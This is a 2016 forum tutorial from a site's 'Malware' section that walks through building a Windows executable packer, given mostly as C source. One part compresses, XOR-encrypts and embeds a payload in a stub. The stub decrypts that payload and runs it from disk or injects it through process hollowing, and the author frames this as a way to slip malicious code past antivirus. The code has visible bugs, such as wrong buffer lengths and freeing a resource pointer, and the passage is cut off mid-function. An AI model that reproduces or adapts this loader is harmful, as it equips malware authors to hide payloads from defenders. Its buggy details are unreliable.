<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Packers - Executable Compression and Data Obfuscation - Malware - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Greetings, all. The following paper will be documenting an example of executable compression, AKA packers which I have developed over the past couple of days. Like crypters, I feel as though they are some form of hidden &amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="847.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Packers - Executable Compression and Data Obfuscation&#39;" href="847.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/1X/200e9f8077ca5789342793e5e1d3145e6a2c1321.PNG" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/1X/200e9f8077ca5789342793e5e1d3145e6a2c1321.PNG" />
<meta property="og:url" content="https://0x00sec.org/t/packers-executable-compression-and-data-obfuscation/847" />
<meta name="twitter:url" content="https://0x00sec.org/t/packers-executable-compression-and-data-obfuscation/847" />
<meta property="og:title" content="Packers - Executable Compression and Data Obfuscation" />
<meta name="twitter:title" content="Packers - Executable Compression and Data Obfuscation" />
<meta property="og:description" content="Greetings, all. The following paper will be documenting an example of executable compression, AKA packers which I have developed over the past couple of days. Like crypters, I feel as though they are some form of hidden dark art of the underground communities. Though there are many publicly available packers out there (UPX, Themida, etc.), I have not seen many papers or articles on how to create them but I have happened to come across Gunther’s How to Write a Simple Executable Packer in C which ..." />
<meta name="twitter:description" content="Greetings, all. The following paper will be documenting an example of executable compression, AKA packers which I have developed over the past couple of days. Like crypters, I feel as though they are some form of hidden dark art of the underground communities. Though there are many publicly available packers out there (UPX, Themida, etc.), I have not seen many papers or articles on how to create them but I have happened to come across Gunther’s How to Write a Simple Executable Packer in C which ..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="7 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="40 ❤" />
<meta property="article:published_time" content="2016-07-29T12:18:56+00:00" />
<meta property="og:ignore_canonical" content="true" />
<link rel="next" href="847%3Fpage=2.html">
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="847.html">Packers - Executable Compression and Data Obfuscation</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/malware.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F7941D"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Malware</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Packers - Executable Compression and Data Obfuscation">
<meta itemprop="articleSection" content="Malware">
<meta itemprop="keywords" content>
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/1X/200e9f8077ca5789342793e5e1d3145e6a2c1321.PNG">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-07-29T12:18:56Z" class="post-time">
July 29, 2016, 12:18pm
</time>
<meta itemprop="dateModified" content="2016-08-01T12:18:59Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>Greetings, all. The following paper will be documenting an example of executable compression, AKA <em>packers</em> which I have developed over the past couple of days. Like <em>crypters</em>, I feel as though they are some form of hidden dark art of the underground communities. Though there are many publicly available packers out there (UPX, Themida, etc.), I have not seen many papers or articles on how to create them but I have happened to come across <a href="https://www.google.com.au/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;ved=0ahUKEwi2hM3ajpjOAhVJI5QKHa0kDz0QFggdMAA&amp;url=http%3A%2F%2Fwww.rohitab.com%2Fdiscuss%2Findex.php%3Fapp%3Dcore%26module%3Dattach%26section%3Dattach%26attach_id%3D4507&amp;usg=AFQjCNH_pvKsYDQ5Q70xsD-J1KmXWk-hfQ&amp;sig2=KYQyHixtZstB_FIOeuiAug&amp;cad=rja">Gunther’s How to Write a Simple Executable Packer in C</a> which has enabled me to pursue further research on this enigmatic topic. After reading this, I hope all of you will gain an understanding of at least how these tools function.</p>
<p><strong>Disclaimer</strong>: The following material may not be beginner-friendly as it requires a fair amount of knowledge of Windows programming.</p>
<pre><code class="lang-makefile">Proficiency in C/C++
Knowledge of the WinAPI and its documentation
Knowledge of basic cryptography
Knowledge of file compression
Knowledge of the PE file structure
</code></pre>
<hr>
<h2>An Introduction to Packers</h2>
<p><em>Packers</em> are a tool which are used for their spacial advantages and deterring reverse engineering attempts such as disassembly by obfuscating the data through compression. Because of the resulting data obfuscation characteristic, it allows malware developers to hide malicious code within executables to evade antivirus detection. This behavior is similar to that of crypters which use encryption for data obfuscation. Packers can also utilize the encryption method of crypters to provide a double layer of obfuscation where compression is the next <em>step</em>. Let’s get a visual representation of a packed executable in action.</p>
<p>The <strong>packer</strong> is responsible for compressing (and encrypting) the payload.</p>
<pre><code class="lang-makefile">+---------+    +--------+    +------+--------------------------------+
| Payload | -&gt; | Packer | =&gt; | Stub | Compressed + encrypted payload |
+---------+    +--------+    +------+--------------------------------+
</code></pre>
<p>The <strong>stub</strong> is the part of the executable which extracts (decrypts and decompresses) the payload for execution.</p>
<pre><code class="lang-makefile">+------+--------------------------------+                 +------------------+
| Stub | Compressed + encrypted payload | == execution =&gt; | Original payload |
+------+--------------------------------+                 +------------------+
</code></pre>
<hr>
<h2>Coding the Packer</h2>
<p>The packer is required to compress and encrypt the payload, then add it to the stub. The following provides a possible packer design.</p>
<h3>Packer Pseudocode</h3>
<pre><code class="lang-makefile">1. Read the payload file into a buffer
2. Update struct with a pointer to the buffer and its size 
3. Compress the payload buffer
4. Encrypt the buffer
5. Create the stub output file
6. Update the stub by adding the payload buffer
</code></pre>
<p>Here is the code for this design.</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;windows.h&gt;
#include &lt;wincrypt.h&gt;
#include &lt;zlib.h&gt;

#include "resource.h"

#define WIN32_LEAN_AND_MEAN
#define DEBUG
#define DEBUG_TITLE "STUB - DEBUG MESSAGE"

#define BUFFER_RSRC_ID 10
#define FILE_SIZE_RSRC_ID 20
#define KEY_RSRC_ID 30

#define KEY_LEN 64

typedef struct _FileStruct {
    PBYTE pBuffer;
    DWORD dwBufSize;
    DWORD dwFileSize;
    PBYTE pKey;
} FileStruct, *pFileStruct;

VOID Debug(LPCSTR fmt, ...) {
#ifdef DEBUG
    va_list args;

    va_start(args, fmt);
    vprintf(fmt, args);

    va_end(args);
#endif
}

FileStruct *LoadFile(LPCSTR szFileName) {
    Debug("Loading %s...\n", szFileName);

    Debug("Initializing struct...\n");
    FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
    if (fs == NULL) {
        Debug("Create %s file structure error: %lu\n", szFileName, GetLastError());
        return NULL;
    }

    Debug("Initializing file...\n");
    // get file handle to file
    HANDLE hFile = CreateFile(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        Debug("Create file error: %lu\n", GetLastError());
        free(fs);
        return NULL;
    }

    // get file size
    Debug("Retrieving file size...\n");
    fs-&gt;dwFileSize = GetFileSize(hFile, NULL);
    if (fs-&gt;dwFileSize == INVALID_FILE_SIZE) {
        Debug("Get file size error: %lu\n", GetLastError());
        CloseHandle(hFile);
        free(fs);
        return NULL;
    }
    fs-&gt;dwBufSize = fs-&gt;dwFileSize;

    // create heap buffer to hold file contents
    fs-&gt;pBuffer = (PBYTE)malloc(fs-&gt;dwFileSize);
    if (fs-&gt;pBuffer == NULL) {
        Debug("Create buffer error: %lu\n", GetLastError());
        CloseHandle(hFile);
        free(fs);
        return NULL;
    }

    // read file contents
    Debug("Reading file contents...\n");
    DWORD dwRead = 0;
    if (ReadFile(hFile, fs-&gt;pBuffer, fs-&gt;dwFileSize, &amp;dwRead, NULL) == FALSE) {
        Debug("Read file error: %lu\n", GetLastError());
        CloseHandle(hFile);
        free(fs);
        return NULL;
    }
    Debug("Read 0x%08x bytes\n\n", dwRead);

    // clean up
    CloseHandle(hFile);

    return fs;
}

BOOL UpdateStub(LPCSTR szFileName, FileStruct *fs) {
    // start updating stub's resources
    HANDLE hUpdate = BeginUpdateResource(szFileName, FALSE);
    // add file as a resource to stub
    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(BUFFER_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pBuffer, fs-&gt;dwBufSize) == FALSE) {
        Debug("Update resource error: %lu\n", GetLastError());
        return FALSE;
    }

    // add file size as a resource to stub
    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(FILE_SIZE_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), (PVOID)&amp;fs-&gt;dwFileSize, sizeof(DWORD)) == FALSE) {
        Debug("Update resource error: %lu\n", GetLastError());
        return FALSE;
    }

    // add decryption key as a resource
    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(KEY_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pKey, KEY_LEN) == FALSE) {
        Debug("Update resource error: %lu\n", GetLastError());
        return FALSE;
    }

    EndUpdateResource(hUpdate, FALSE);

    return TRUE;
}

BOOL BuildStub(LPCSTR szFileName, FileStruct *fs) {
    Debug("Building stub: %s...\n", szFileName);

    // get stub program as a resource
    HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(1), "STUB");
    if (hRsrc == NULL) {
        Debug("Find stub resource error: %lu\n", GetLastError());
        return FALSE;
    }
    DWORD dwSize = SizeofResource(NULL, hRsrc);

    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
    if (hGlobal == NULL) {
        Debug("Load stub resource error: %lu\n", GetLastError());
        return FALSE;
    }

    // get stub's file content
    PBYTE pBuffer = (PBYTE)LockResource(hGlobal);
    if (pBuffer == NULL) {
        Debug("Lock stub resource error: %lu\n", GetLastError());
        return FALSE;
    }

    // create output file
    Debug("Creating stub...\n");
    HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        Debug("Create stub error: %lu\n", GetLastError());
        free(pBuffer);
        return FALSE;    
    }

    // write stub content to output file
    Debug("Writing payload to stub...\n");
    DWORD dwWritten = 0;
    if (WriteFile(hFile, pBuffer, dwSize, &amp;dwWritten, NULL) == FALSE) {
        Debug("Write payload to stub error: %lu\n", GetLastError());
        CloseHandle(hFile);
        free(pBuffer);
        return FALSE;
    }
    Debug("Wrote 0x%08x bytes\n\n");

    CloseHandle(hFile);

    // add payload to stub
    Debug("Updating stub with payload...\n");
    if (UpdateStub(szFileName, fs) == FALSE)
        return FALSE;

    return TRUE;
}

BOOL GenerateKey(FileStruct *fs) {
    fs-&gt;pKey = (PBYTE)malloc(KEY_LEN);
    if (fs-&gt;pKey == NULL) return FALSE;

    // initialize crypto service provider
    HCRYPTPROV hProv = NULL;
    if (CryptAcquireContext(&amp;hProv, NULL, NULL, PROV_RSA_FULL, 0) == FALSE) {
        Debug("Crypt aquire context error: %lu\n", GetLastError());
        free(fs-&gt;pKey);
        return FALSE;
    }

    // generate secure bytes
    Debug("Generating cryptographically secure bytes...\n");
    if (CryptGenRandom(hProv, KEY_LEN, fs-&gt;pKey) == FALSE) {
        Debug("Generate random key error: %lu\n", GetLastError());
        free(fs-&gt;pKey);
        return FALSE;
    }
    Debug("Using key: ");
    for (int i = 0; i &lt; KEY_LEN; i++)
        Debug("0x%02x ", fs-&gt;pKey[i]);
    Debug("\n");

    // clean up
    CryptReleaseContext(hProv, 0);

    return TRUE;
}

// XOR
BOOL EncryptPayload(FileStruct *fs) {
    Debug("EncryptPayloading payload...\n");

    Debug("Generating key...\n");
    if (GenerateKey(fs) == FALSE) return FALSE;

    for (DWORD i = 0; i &lt; fs-&gt;dwBufSize; i++)
        fs-&gt;pBuffer[i] ^= fs-&gt;pKey[i % KEY_LEN];

    Debug("EncryptPayloadion routine complete\n");
    return TRUE;
}

BOOL CompressPayload(FileStruct *fs) {
    Debug("Compressing payload...\n");
    
    PBYTE pCompressedBuffer = (PBYTE)malloc(fs-&gt;dwBufSize);
    ULONG ulCompressedBufSize = compressBound((ULONG)fs-&gt;dwBufSize);
    compress(pCompressedBuffer, &amp;ulCompressedBufSize, fs-&gt;pBuffer, fs-&gt;dwBufSize);

    fs-&gt;pBuffer = pCompressedBuffer;
    fs-&gt;dwBufSize = ulCompressedBufSize;

    Debug("Compression routine complete\n");
    return TRUE;
}

int main(int argc, char *argv[]) {
    printf("Copyright (C) 2016  93aef0ce4dd141ece6f5\n\n");
    if (argc &lt; 3) {
        Debug("Usage: %s [INPUT FILE] [OUTPUT FILE]\n", argv[0]);
        return 1;
    }

    FileStruct *fs = LoadFile(argv[1]);
    if (fs == NULL) return 1;

    Debug("Applying obfuscation...\n");
    if (CompressPayload(fs) == FALSE) {
        free(fs);
        return 1;
    }

    if (EncryptPayload(fs) == FALSE) {
        free(fs);
        return 1;
    }
    Debug("\n");

    if (BuildStub(argv[2], fs) == FALSE) {
        free(fs-&gt;pKey);
        free(fs);
        return 1;
    }

    // clean up
    free(fs-&gt;pKey);
    free(fs);

    Debug("\nDone\n");

    return 0;
}
</code></pre>
<p>The <code>CompressPayload</code> function uses the <a>zLib</a> third party compression library to perform the compression routine on the payload buffer.</p>
<p>The <code>EncryptPayload</code> function uses the XOR cipher method purely as an example. Use of other ciphers in place of the XOR such as RC4 or AES is entirely possible. There is a function within this function, <code>GenerateKey</code> which uses the WinAPI’s Cryptography library to uniquely (for each execution of the program) generate a 32-bit length key using a CSPRNG.</p>
<p>The <code>BuildStub</code> function creates and adds resources to the stub. These resources are the information stored inside the file struct <code>_FileStruct</code> as it is required in the routines within the stub itself. These resources will be visually shown after the stub code is covered.</p>
<hr>
<h2>Coding the Stub</h2>
<p>The stub is responsible for the extraction and execution of the payload. Note that it must be the reverse operation of the packer. The following shows a possible design.</p>
<h3>Stub Pseudocode</h3>
<pre><code class="lang-makefile">1. Extract the resources
2. Decrypt the payload buffer
3. Decompress the buffer
4. Drop the payload
5. Execute the payload
</code></pre>
<p>The code for this design is as follows.</p>
<pre><code class="lang-cpp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;windows.h&gt;
#include &lt;wincrypt.h&gt;
#include &lt;zlib.h&gt;

#define WIN32_LEAN_AND_MEAN
#define DEBUG
#define DEBUG_TITLE "STUB - DEBUG MESSAGE"

#define BUFFER_RSRC_ID 10
#define FILE_SIZE_RSRC_ID 20
#define KEY_RSRC_ID 30

#define KEY_LEN 64

typedef VOID(*PZUVOS)(HANDLE, PVOID);

typedef struct _FileStruct {
    PBYTE pBuffer;
    DWORD dwBufSize;
    DWORD dwFileSize;
    PBYTE pKey;
} FileStruct, *pFileStruct;

VOID Debug(LPCSTR fmt, ...) {
#ifdef DEBUG
    CHAR szDebugBuf[BUFSIZ];
    va_list args;

    va_start(args, fmt);
    vsprintf(szDebugBuf, fmt, args);
    MessageBox(NULL, szDebugBuf, DEBUG_TITLE, MB_OK);

    va_end(args);
#endif
}

FileStruct *ExtractPayload(VOID) {
    FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
    if (fs == NULL) return NULL;

    // get file buffer
    // get size of resource
    HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(BUFFER_RSRC_ID), RT_RCDATA);
    if (hRsrc == NULL) {
        Debug("Find buffer resource error: %lu\n", GetLastError());
        free(fs);
        return NULL;
    }
    fs-&gt;dwBufSize = SizeofResource(NULL, hRsrc);

    // get pointer to resource buffer
    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
    if (hGlobal == NULL) {
        Debug("Load buffer resource error: %lu\n", GetLastError());
        free(fs);
        return NULL;
    }

    fs-&gt;pBuffer = (PBYTE)LockResource(hGlobal);
    if (fs-&gt;pBuffer == NULL) {
        Debug("Lock buffer resource error: %lu\n", GetLastError());
        free(fs);
        return NULL;
    }

    // get actual file size resource
    hRsrc = FindResource(NULL, MAKEINTRESOURCE(FILE_SIZE_RSRC_ID), RT_RCDATA);
    if (hRsrc == NULL) {
        Debug("Find file size error: %lu\n", GetLastError());
        free(fs);
        return NULL;
    }

    // get file size value
    hGlobal = LoadResource(NULL, hRsrc);
    if (hGlobal == NULL) {
        Debug("Load buffer resource error: %lu\n", GetLastError());
        free(fs);
        return NULL;
    }
    fs-&gt;dwFileSize = *(LPDWORD)LockResource(hGlobal);

    // get decryption key
    hRsrc = FindResource(NULL, MAKEINTRESOURCE(KEY_RSRC_ID), RT_RCDATA);
    if (hRsrc == NULL) {
        Debug("Find key resource error: %lu\n", GetLastError());
        free(fs);
        return NULL;
    }

    // get pointer to key buffer
    hGlobal = LoadResource(NULL, hRsrc);
    if (hGlobal == NULL) {
        Debug("Load key resource error: %lu\n", GetLastError());
        free(fs);
        return NULL;
    }
    fs-&gt;pKey = (PBYTE)LockResource(hGlobal);
    if (fs-&gt;pKey == NULL) {
        Debug("Lock buffer resource error: %lu\n", GetLastError());
        free(fs);
        return NULL;
    }

    return fs;
}

BOOL UpdateResources(FileStruct *fs, LPCSTR szFileName) {
    HANDLE hUpdate = BeginUpdateResource(szFileName, FALSE);
    // add file as a resource to stub
    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(BUFFER_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pBuffer, fs-&gt;dwBufSize) == FALSE) {
        Debug("Update resource error: %lu\n", GetLastError());
        return FALSE;
    }

    // add decryption key as a resource
    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(KEY_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pKey, KEY_LEN) == FALSE) {
        Debug("Update resource error: %lu\n", GetLastError());
        return FALSE;
    }

    if (EndUpdateResource(hUpdate, FALSE) == FALSE) {
        Debug("End update resource error: %lu\n", GetLastError());
    }

    return TRUE;
}

BOOL GenerateKey(FileStruct *fs) {
    fs-&gt;pKey = (PBYTE)malloc(KEY_LEN);
    if (fs-&gt;pKey == NULL) return FALSE;

    // initialize crypto service provider
    HCRYPTPROV hProv = NULL;
    if (CryptAcquireContext(&amp;hProv, NULL, NULL, PROV_RSA_FULL, 0) == FALSE) {
        Debug("Crypt aquire context error: %lu\n", GetLastError());
        free(fs-&gt;pKey);
        return FALSE;
    }

    // generate secure bytes
    //Debug("Generating cryptographically secure bytes...\n");
    if (CryptGenRandom(hProv, KEY_LEN, fs-&gt;pKey) == FALSE) {
        Debug("Generate random key error: %lu\n", GetLastError());
        free(fs-&gt;pKey);
        return FALSE;
    }
    /*
    Debug("Using key: ");
    for (int i = 0; i &lt; KEY_LEN; i++)
        Debug("0x%02x ", fs-&gt;pKey[i]);
    Debug("\n");
    */

    // clean up
    CryptReleaseContext(hProv, 0);

    return TRUE;
}

// XOR
BOOL DecryptPayload(FileStruct *fs) {
    PBYTE pDecryptPayloadedBuffer = (PBYTE)malloc(fs-&gt;dwBufSize);
    if (pDecryptPayloadedBuffer == NULL) return FALSE;

    for (DWORD i = 0; i &lt; fs-&gt;dwBufSize; i++)
        pDecryptPayloadedBuffer[i] = fs-&gt;pBuffer[i] ^ fs-&gt;pKey[i % KEY_LEN];

    fs-&gt;pBuffer = pDecryptPayloadedBuffer;

    return TRUE;
}

// XOR
BOOL Encrypt(FileStruct *fs) {
    return DecryptPayload(fs);
}

BOOL DecompressPayload(FileStruct *fs) {
    PBYTE pDecompressedBuffer = (PBYTE)malloc(fs-&gt;dwFileSize);
    ULONG ulDecompressedBufSize;
    uncompress(pDecompressedBuffer, &amp;ulDecompressedBufSize, fs-&gt;pBuffer, fs-&gt;dwFileSize);

    fs-&gt;pBuffer = pDecompressedBuffer;
    fs-&gt;dwBufSize = ulDecompressedBufSize;

    return TRUE;
}

VOID DropAndExecutePayload(FileStruct *fs, LPCSTR szFileName) {
    DWORD dwWritten;
    HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hFile, fs-&gt;pBuffer, fs-&gt;dwFileSize, &amp;dwWritten, NULL);
    CloseHandle(hFile);
    ShellExecute(NULL, NULL, szFileName, NULL, NULL, SW_NORMAL);
}

BOOL MemoryExecutePayload(FileStruct *fs) {
    // PE headers
    PIMAGE_DOS_HEADER pidh;
    PIMAGE_NT_HEADERS pinh;
    PIMAGE_SECTION_HEADER pish;

    // process info
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // pointer to virtually allocated memory
    LPVOID lpAddress = NULL;

    // context of suspended thread for setting address of entry point
    CONTEXT context;

    // need function pointer for ZwUnmapViewOfSection from ntdll.dll
    PZUVOS pZwUnmapViewOfSection = NULL;

    // get file name
    CHAR szFileName[MAX_PATH];
    GetModuleFileName(NULL, szFileName, MAX_PATH);

    // first extract header info 
    // check if valid DOS header
    pidh = (PIMAGE_DOS_HEADER)fs-&gt;pBuffer;
    if (pidh-&gt;e_magic != IMAGE_DOS_SIGNATURE) {
        Debug("DOS signature error");
        return FALSE;
    }

    // check if valid pe file
    pinh = (PIMAGE_NT_HEADERS)((DWORD)fs-&gt;pBuffer + pidh-&gt;e_lfanew);
    if (pinh-&gt;Signature != IMAGE_NT_SIGNATURE) {
        Debug("PE signature error");
        return FALSE;
    }

    // first create process as suspended
    memset(&amp;si, 0, sizeof(si));
    memset(&amp;pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    if (CreateProcess(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi) == FALSE) {
        Debug("Create process error %lu\n", GetLastError());
        return FALSE;
    }

    context.ContextFlags = CONTEXT_FULL;
    if (GetThreadContext(pi.hThread, &amp;context) == FALSE) {
        Debug("Get thread context");
    }

    // unmap memory space for our process
    pZwUnmapViewOfSection = (PZUVOS)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
    pZwUnmapViewOfSection(pi.hProcess, (PVOID)pinh-&gt;OptionalHeader.ImageBase);

    // allocate virtual space for process
    lpAddress = VirtualAllocEx(pi.hProcess, (PVOID)pinh-&gt;OptionalHeader.ImageBase, pinh-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpAddress == NULL) {
        Debug("Virtual alloc error: %lu\n", GetLastError());
        return FALSE;
    }

    // write headers into memory
    if (WriteProcessMemory(pi.hProcess, (PVOID)pinh-&gt;OptionalHeader.ImageBase, fs-&gt;pBuffer, pinh-&gt;OptionalHeader.SizeOfHeaders, NULL) == FALSE) {
        Debug ("Write headers error: %lu\n", GetLastError());
        return FALSE;
    }

    // write each section into memory
    for (int i = 0; i &lt; pinh-&gt;FileHeader.NumberOfSections; i++) {
        // calculate section header of each section
        pish = (PIMAGE_SECTION_HEADER)((DWORD)fs-&gt;pBuffer + pidh-&gt;e_lfanew + sizeof (IMAGE_NT_HEADERS) + sizeof (IMAGE_SECTION_HEADER) * i);
        // write section data into memory
        WriteProcessMemory(pi.hProcess, (PVOID)(pinh-&gt;OptionalHeader.ImageBase + pish-&gt;VirtualAddress), (LPVOID)((DWORD)fs-&gt;pBuffer + pish-&gt;PointerToRawData), pish-&gt;SizeOfRawData, NULL);
    }

    // set starting address at virtual address: address of entry point
    context.Eax = pinh-&gt;OptionalHeader.ImageBase + pinh-&gt;OptionalHeader.AddressOfEntryPoint;
    if (SetThreadContext(pi.hThread, &amp;context) == FALSE) {
        Debug("Set thread context error: %lu\n", GetLastError());
        return FALSE;
    }

    // resume our suspended processes
    if (ResumeThread(pi.hThread) == -1) {
        Debug("Resume thread error: %lu\n", GetLastError());
        return FALSE;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE;
}

/*
VOID RunFromMemory(FileStruct *fs) {
    Debug("%p", fs-&gt;pBuffer);
    HMEMORYMODULE hModule = MemoryLoadLibrary(fs-&gt;pBuffer, fs-&gt;dwFileSize);
    if (hModule == NULL) {
        Debug("Memory load library error: %lu\n", GetLastError());
        return;
    }

    int nSuccess = MemoryCallEntryPoint(hModule);
    if (nSuccess &lt; 0) {
